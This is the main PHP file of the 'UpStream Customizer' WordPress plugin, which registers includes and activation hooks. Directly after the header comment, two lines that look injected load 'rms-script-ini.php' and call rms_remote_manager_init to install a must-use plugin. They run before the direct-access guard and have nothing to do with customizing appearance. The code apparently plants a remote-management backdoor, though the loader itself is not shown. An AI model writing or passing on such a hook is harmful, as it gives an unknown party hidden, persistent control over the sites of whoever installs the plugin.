<?php
/**
 * Plugin Name: UpStream Customizer
 * Plugin URI: https://upstreamplugin.com/extensions/customizer
 * Description: Adds controls to easily customize the appearance of the WordPress Project Management plugin by UpStream.
 * Author: UpStream
 * Author URI: https://upstreamplugin.com
 * Version: 1.1.11
 * Text Domain: upstream-customizer
 * Domain Path: /languages
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Prevent direct access.
if (!defined('ABSPATH')) exit;

require_once 'includes.php';
require_once 'Customizer.php';

if ( file_exists( __DIR__ . '/vendor/autoload.php' ) ) {
    require_once __DIR__ . '/vendor/autoload.php';
}

$mainNamespace = '\\UpStream\\Plugins\\Customizer';

register_activation_hook(__FILE__, array($mainNamespace, 'activationCallback'));

add_action('upstream_loaded', array($mainNamespace, 'instance'));
